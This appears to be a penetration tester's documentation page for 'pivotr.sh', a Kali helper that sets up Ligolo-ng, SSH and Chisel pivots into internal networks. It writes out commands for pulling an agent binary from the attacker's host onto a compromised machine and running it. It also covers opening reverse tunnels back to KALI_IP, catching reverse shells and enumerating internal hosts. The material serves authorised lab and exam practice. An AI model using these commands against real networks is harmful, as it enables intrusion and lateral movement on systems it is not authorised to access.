---
tags:
  - phase/post-exploitation
  - phase/pivoting
  - tool/pivotr
  - tool/ligolo
  - tool/chisel
  - tool/ssh
  - type/tool-docs
---

# pivotr.sh

## What It Is
Kali-side pivot setup and reference assistant. Automates Ligolo-ng TUN interface creation, route injection, proxy startup, and agent transfer. Also generates fully resolved copy-paste commands for SSH tunnels and Chisel — no unfilled placeholders. Runs **on Kali only**, never touches compromised hosts.

> [!important] Setup and reference only — no exploitation
> OffSec compliant. State tracked in `~/.pivotr/state.tsv` for clean teardown.

---

## Quick Reference

```bash
# Ligolo single pivot (most common engagement scenario)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# Ligolo double pivot (second internal network)
./pivotr.sh ligolo2 --subnet 172.16.1.0/24

# Add Ligolo listeners (for reverse shells through tunnel)
./pivotr.sh listener --port 4444 --port 80 --type both

# SSH dynamic SOCKS proxy
./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data

# SSH local port forward
./pivotr.sh ssh --type local --pivot-ip 10.10.10.5 --target-ip 172.16.1.10 --target-port 3389

# Chisel SOCKS (when SSH unavailable)
./pivotr.sh chisel --type socks --start-server

# Access pivot's localhost services (after tunnel is up)
sudo ip route add 240.0.0.1/32 dev ligolo

# Reconnect last tunnel (after VPN drop / shell loss)
./pivotr.sh reconnect

# Status and teardown
./pivotr.sh status
./pivotr.sh teardown --all
```

---

## Decision Tree

```
Have SSH on pivot with valid creds?
├─ YES → pivotr.sh ssh --type dynamic     (quickest, no binary upload needed)
└─ NO  → can you upload a binary?
         ├─ YES → pivotr.sh ligolo        (preferred: full IP routing, no proxychains)
         └─ NO  → pivotr.sh chisel        (pure SOCKS, client connects back)

Need to reach a SECOND internal network?
└─ pivotr.sh ligolo2 --subnet 172.16.1.0/24
   + listener_add in Ligolo console for agent forwarding

Need to catch reverse shells through an existing Ligolo tunnel?
└─ pivotr.sh listener --port 4444 --type shell
   (listener_add in console + penelope -p 4444 -O on Kali)

Need to forward ONE specific internal port (not full routing)?
├─ SSH available  → pivotr.sh ssh --type local
└─ SSH not avail  → pivotr.sh chisel --type forward
```

---

## Mode: `ligolo` — Single Pivot

Creates TUN interface, adds route, starts proxy, optionally serves agent binaries via HTTP.

```bash
# Minimal
./pivotr.sh ligolo --subnet 10.10.10.0/24

# With file server (auto-serves agent binaries for transfer)
./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve

# All options
./pivotr.sh ligolo \
  --subnet 10.10.10.0/24 \
  --pivot-ip 10.10.10.5 \    # optional; used in printed transfer commands
  --port 11601 \             # proxy listen port (default: 11601)
  --tun-name ligolo \        # TUN interface name (default: ligolo)
  --kali-ip 10.10.14.1 \    # auto-detected from tun0/eth0 if omitted
  --serve \                  # start HTTP file server
  --serve-port 80            # file server port (default: 80)
```

**What it does automatically:**
1. Auto-detects Kali IP (tun0 → eth0 → `hostname -I`)
2. Finds `ligolo-proxy` binary (checks PATH + `/opt/ligolo-ng`, `$HOME/tools/ligolo-ng`, etc.)
3. Creates TUN interface via `sudo ip tuntap add user $(whoami) mode tun ligolo`
4. Adds route: `sudo ip route add <subnet> dev ligolo`
5. Starts `ligolo-proxy -nobanner -selfcert -laddr 0.0.0.0:11601`
6. If `--serve`: symlinks agent binaries into CWD, starts `python3 -m http.server`
7. Prints a fully resolved **NEXT STEPS** box

**What the next steps box contains:**
```bash
# Transfer agent to pivot
# Linux:
wget http://KALI_IP:80/agent -O /tmp/agent && chmod +x /tmp/agent

# Windows:
iwr http://KALI_IP:80/agent.exe -O agent.exe

# Run on pivot
# Linux:   /tmp/agent -connect KALI_IP:11601 -ignore-cert
# Windows: .\agent.exe -connect KALI_IP:11601 -ignore-cert

# In Ligolo console (when agent connects):
session        # select the agent
ifconfig       # confirm internal interface
start          # activate tunnel

# Verify tunnel (from Kali):
nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>

# Step 5 — enumerate internal network:
./recon.sh --auto <INTERNAL_HOST_IP>          # full recon on internal target
./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'         # if domain-joined
nxc smb <SUBNET>/24 --gen-relay-list /tmp/smb_hosts.txt   # find SMB hosts

# Need reverse shells through this tunnel?
# → pivotr.sh listener --port 4444
```

**Agent binary locations searched:**
- `/usr/share/ligolo-ng-common-binaries/` (apt package `ligolo-ng-common-binaries`)
- `./agent`, `$HOME/tools/ligolo-ng/agent`, `/opt/ligolo-ng/agent`

> [!tip] Access the pivot's localhost via `240.0.0.1` — Ligolo's magic IP. No port forward needed for services bound to 127.0.0.1 on the pivot.

---

## Mode: `ligolo2` — Double Pivot

Adds a second TUN + route for a second internal network reached through the first pivot. The proxy is already running from `ligolo` mode — this just extends routing.

```bash
./pivotr.sh ligolo2 --subnet 172.16.1.0/24
./pivotr.sh ligolo2 --subnet 172.16.1.0/24 --tun-name ligolo2  # default
```

**Printed next steps:**
```bash
# In Ligolo console on SESSION 1 (first pivot):
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
listener_list    # verify it appears

# On second pivot host — agent connects THROUGH first pivot:
# <PIVOT1_INTERNAL_IP> = the internal-facing IP shown by `ifconfig` in Pivot1's Ligolo session
# Linux:   /tmp/agent -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert
# Windows: .\agent.exe -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert

# In Ligolo console, SESSION 2:
tunnel_start --tun ligolo2
```

> [!tip] Magic IPs: `240.0.0.1` = pivot1's localhost, `240.0.0.2` = pivot2's localhost (double-nested)

---

## Mode: `listener` — Ligolo Console Listener Commands

Generates `listener_add` commands to paste into the Ligolo interactive console, plus shell catchers and file server commands.

```bash
./pivotr.sh listener --port 4444                          # both (default)
./pivotr.sh listener --port 4444 --type shell             # shell only
./pivotr.sh listener --port 80 --type file                # file server only
./pivotr.sh listener --port 4444 --port 80 --type both    # multiple ports
```

**Output example (`--port 4444 --type both`):**
```
# Paste into Ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_list   ← verify

# Shell catcher (run on Kali):
penelope -p 4444 -O

# File server (run on Kali):
python3 -m http.server 4444
```

> [!important] Shell catchers use Penelope with `-O` (OffSec-safe flag) — not netcat.

**Once a reverse shell lands on Kali:**
```bash
# Upgrade shell first (on remote host):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Then enumerate the internal host from Kali:
./recon.sh --auto <INTERNAL_HOST_IP>   # note IP from shell, run recon
./escalatr.sh                              # run directly on the remote host
```

---

## Mode: `ssh` — SSH Tunnel Reference

Generates fully resolved SSH tunnel commands with all values filled in from flags. Kali IP auto-detected if not provided.

### Dynamic SOCKS Proxy
```bash
./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data --socks-port 9999

# Run ON KALI:
ssh -N -D 0.0.0.0:9999 www-data@10.10.10.5 -p 22

# proxychains.conf:
socks5 127.0.0.1 9999

# Verification commands are printed after tunnel setup:
proxychains -q curl -s http://172.16.1.10          # HTTP reachability
proxychains -q nxc smb 172.16.1.0/24               # SMB sweep
proxychains -q nmap -sT -Pn -p 80,443,445 172.16.1.10  # port check (must use -sT -Pn)
```

### Local Port Forward
```bash
./pivotr.sh ssh --type local \
  --pivot-ip 10.10.10.5 --pivot-user user \
  --target-ip 172.16.1.10 --target-port 3389 \
  --local-port 13389

# Effect: Kali:13389 → 10.10.10.5 → 172.16.1.10:3389
# Run ON KALI:
ssh -N -L 0.0.0.0:13389:172.16.1.10:3389 user@10.10.10.5 -p 22
# Access: localhost:13389

# Verification commands are printed after tunnel setup:
curl -s http://localhost:13389        # HTTP services
nc -zv localhost 13389                # TCP check (non-HTTP)
# If not working: check ssh is running, ufw status, confirm pivot routing
```

### Remote Port Forward (pivot initiates)
```bash
./pivotr.sh ssh --type remote \
  --target-ip 127.0.0.1 --target-port 8080 --local-port 8080

# Run ON PIVOT:
ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@KALI_IP
# Requires: sudo systemctl start ssh (on Kali)

# Verify tunnel works (run on Kali after pivot connects):
nc -zv localhost 8080                    # TCP port check
curl -s --connect-timeout 3 http://localhost:8080  # if HTTP

# Debug if tunnel fails:
# Confirm pivot SSH outbound to Kali: nc -zv KALI_IP 22 (from pivot)
# Check Kali sshd GatewayPorts: grep GatewayPorts /etc/ssh/sshd_config
# Check local port is bound: ss -tlnp | grep 8080
```

### Reverse Dynamic SOCKS (pivot initiates)
```bash
./pivotr.sh ssh --type remote-dynamic --socks-port 9999

# Run ON PIVOT:
ssh -N -R 9999 kali@KALI_IP
# proxychains.conf: socks5 127.0.0.1 9999
# Requires: sudo systemctl start ssh (on Kali)
```

### SSH Options

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | required | `local`, `dynamic`, `remote`, `remote-dynamic` |
| `--pivot-ip` | — | Pivot host IP |
| `--pivot-user` | current user | SSH username on pivot |
| `--pivot-port` | 22 | SSH port on pivot |
| `--target-ip` | — | Internal target IP |
| `--target-port` | — | Internal target port |
| `--local-port` | target-port | Local Kali port to bind |
| `--kali-ip` | auto-detected | Kali IP (for remote tunnels) |
| `--kali-user` | kali | SSH username on Kali |
| `--socks-port` | 9999 | SOCKS proxy port (dynamic modes) |

> [!warning] proxychains nmap must use `-sT -Pn` — SYN scans and ICMP do not traverse SOCKS.

---

## Mode: `chisel` — Chisel Tunnel Reference

Use when SSH is unavailable on the pivot. Kali runs the server; pivot runs the client (reverse connection).

### SOCKS Proxy
```bash
./pivotr.sh chisel --type socks

# Run ON KALI:
chisel server -p 8080 --socks5 --reverse

# Run ON PIVOT:
chisel client KALI_IP:8080 R:9999:socks

# proxychains.conf:
socks5 127.0.0.1 9999
```

```bash
# Start chisel server on Kali immediately
./pivotr.sh chisel --type socks --start-server
```

**Verify SOCKS proxy (after pivot connects):**
```bash
proxychains -q nxc smb <INTERNAL_SUBNET>/24          # SMB sweep
proxychains -q curl -s http://<INTERNAL_IP>           # HTTP test
proxychains -q nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>  # port check (must use -sT -Pn)

# Then enumerate through the proxy:
proxychains ./recon.sh --auto <INTERNAL_IP>
proxychains ./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'  # if AD
```

### Port Forward
```bash
./pivotr.sh chisel --type forward \
  --target-ip 172.16.1.10 --target-port 3389 --local-port 13389

# Run ON KALI:
chisel server -p 8080 --reverse

# Run ON PIVOT:
chisel client KALI_IP:8080 R:13389:172.16.1.10:3389

# Access on Kali: localhost:13389
```

### Chisel Options

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | required | `socks` or `forward` |
| `--kali-ip` | auto-detected | Kali IP for client connect |
| `--port` | 8080 | Chisel server listen port |
| `--socks-port` | 9999 | Local SOCKS port (socks type) |
| `--target-ip` | — | Forward destination |
| `--target-port` | — | Forward destination port |
| `--local-port` | target-port | Local Kali port |
| `--start-server` | off | Start chisel server on Kali now |

---

## Mode: `status`

```bash
./pivotr.sh status
```

Shows: TUN interfaces, routes via ligolo interfaces, running `ligolo-proxy` processes, running `chisel` processes, running `python3 -m http.server` processes.

---

## Mode: `teardown`

```bash
# Remove everything tracked (routes, TUN interfaces, background processes)
./pivotr.sh teardown --all

# Remove a specific route only
./pivotr.sh teardown --subnet 10.10.10.0/24

# Custom TUN names
./pivotr.sh teardown --tun-name ligolo --tun2-name ligolo2
```

State is tracked in `$TOOLKIT_ROOT/pivots/state.tsv`. Teardown reads this file to know what it created. TUN and route removal requires `sudo`.

> [!tip] Ctrl+C during `ligolo` or `chisel --start-server` also cleans up background processes automatically via trap handler.

---

## Mode: `reconnect` — Restore Last Tunnel

Re-establishes the most recently configured tunnel after a VPN drop, shell loss, or Kali restart. Reads the last tunnel configuration from `$TOOLKIT_ROOT/pivots/state.tsv` and replays it.

```bash
./pivotr.sh reconnect
```

**What it does:**
1. Reads last `tunnel` entry from `$TOOLKIT_ROOT/pivots/state.tsv`
2. Tears down any stale TUN interfaces, routes, or processes
3. Re-runs the original `ligolo` or `chisel` setup with the same parameters

> [!tip] Use this when your VPN reconnects mid-engagement and your Ligolo tunnel needs to come back up. The agent on the pivot is still running — you just need to restart the proxy side.

> [!note] `reconnect` only restores the Kali-side setup. You still need to re-run the agent on the pivot host if it also died.

---

## Install

```bash
# Ligolo-ng proxy + pre-built agent binaries
sudo apt install ligolo-ng ligolo-ng-common-binaries

# Chisel (if needed — not in Kali repos)
# Download: https://github.com/jpillora/chisel/releases
sudo cp chisel_linux_amd64 /usr/local/bin/chisel && sudo chmod +x /usr/local/bin/chisel

# proxychains (pre-installed on Kali)
# Config: /etc/proxychains4.conf
# Add:    socks5 127.0.0.1 9999
```

---

## Related

- [[ligolo-ng]] — manual Ligolo-ng commands, console reference, troubleshooting
- [[Tunneling_Pivoting]] — manual techniques and theory
- [[OffSec_Pivoting_Operational_Addendum]] — engagement-day pivot reference
- [[OffSec_Pivoting_Mental_Model_Bus_Review]] — decision-tree bus review
- [[penelope]] — shell handler used for reverse shells through tunnel
- [[Active_Recon]] — scanning internal networks after pivot is established
- [[recon]] — run against internal hosts once routing is up
